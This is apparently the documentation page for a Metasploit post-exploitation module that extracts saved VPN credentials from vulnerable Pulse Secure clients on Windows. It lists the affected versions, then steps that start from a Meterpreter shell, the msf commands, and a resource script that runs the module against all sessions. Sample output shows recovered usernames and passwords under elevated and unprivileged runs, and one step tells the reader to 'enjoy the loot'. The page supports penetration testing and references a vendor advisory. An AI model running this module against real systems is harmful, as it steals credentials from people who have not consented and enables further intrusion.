## Vulnerable Application

Pulse Secure VPN Client for versions 9.1 prior to 9.1R4 and 9.0 prior to 9.0R5.

An end-to-end setup with working Juniper Pulse Secure VPN server, Pulse Secure client on
Microsoft Windows, and valid credentials are required for Pulse Secure client to save
credentials locally and therefore test this.

## Verification Steps

1. Get a Meterpreter shell on a Windows machine that has Pulse Secure client installed.
2. Load the module: `use post/windows/gather/credentials/pulse_secure`
3. Set the correct session on the module: `set SESSION *session id*`
4. Run the module with `run` and enjoy the loot.

## Scenarios

The command for all scenarios is the same:

```
msf > use post/windows/gather/credentials/pulse_secure
msf > set SESSION 1
msf > run
```

If you wish to run the post module against all sessions from framework, here is how:

1. Create the following resource script:
```
framework.sessions.each_pair do |sid, session|
  run_single("use post/windows/gather/credentials/pulse_secure")
  run_single("set SESSION #{sid}")
  run_single("run")
end
```
2. At the msf prompt, execute the above resource script:
`msf > resource path-to-resource-script`

### Pulse Secure 9.0.4 on Microsoft Windows 10 Enterprise 19042

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.0.4.1731.
[+] This version is considered vulnerable.
[*] Running credentials acquisition.
[+] Account found
[*]      Username: 
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

### Pulse Secure 9.0.5 on Microsoft Windows 10 Enterprise 19042

With leftovers from previously installed version (9.0.4):

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.0.5.1907.
[!] You're executing from an unprivileged process so this version is considered safe.
[!] However, there might be leftovers from previous versions in the registry.
[!] We recommend running this script in elevated mode to obtain credentials saved by recent versions.
[*] Running credentials acquisition.
[+] Account found
[*]      Username:
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

Without any leftovers from previously installed versions:

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.0.5.1907.
[!] You're executing from an unprivileged process so this version is considered safe.
[!] However, there might be leftovers from previous versions in the registry.
[!] We recommend running this script in elevated mode to obtain credentials saved by recent versions.
[*] Running credentials acquisition.
[*] Post module execution completed
```


### Pulse Secure 9.0.5 on Microsoft Windows 10 Enterprise 19042 (Elevated)

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.0.5.1907.
[+] You're executing from a privileged process so this version is considered vulnerable.
[*] Running credentials acquisition.
[+] Account found
[*]      Username: john.doe@contoso.local
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

### Pulse Secure 9.1.3 on Microsoft Windows 10 Enterprise 19042

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.1.3.1313.
[+] This version is considered vulnerable.
[*] Running credentials acquisition.
[+] Account found
[*]      Username:
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

### Pulse Secure 9.1.4 on Microsoft Windows 10 Enterprise 19042

With leftovers from previously installed version (9.1.3):

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.1.4.1955.
[!] You're executing from an unprivileged process so this version is considered safe.
[!] However, there might be leftovers from previous versions in the registry.
[!] We recommend running this script in elevated mode to obtain credentials saved by recent versions.
[*] Running credentials acquisition.
[+] Account found
[*]      Username: 
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

Without leftovers:

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.1.4.1955.
[!] You're executing from an unprivileged process so this version is considered safe.
[!] However, there might be leftovers from previous versions in the registry.
[!] We recommend running this script in elevated mode to obtain credentials saved by recent versions.
[*] Running credentials acquisition.
[*] Post module execution completed
```

### Pulse Secure 9.1.4 on Microsoft Windows 10 Enterprise 19042 (Elevated)

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[*] Target is running Pulse Secure Connect build 9.1.4.1955.
[+] You're executing from a privileged process so this version is considered vulnerable.
[*] Running credentials acquisition.
[+] Account found
[*]      Username: john.doe@contoso.local
[*]      Password: John2020!!
[*]      URI: https://vpn.contoso.local
[*]      Name: Contoso VPN
[*]      Source: user
[*] Post module execution completed
```

### Host without Pulse Secure

```
msf6 post(windows/gather/credentials/pulse_secure) > run

[-] Pulse Secure Connect client is not installed on this system
[*] Post module execution completed
```

## References

- https://qkaiser.github.io/reversing/2020/10/27/pule-secure-credentials
- https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601
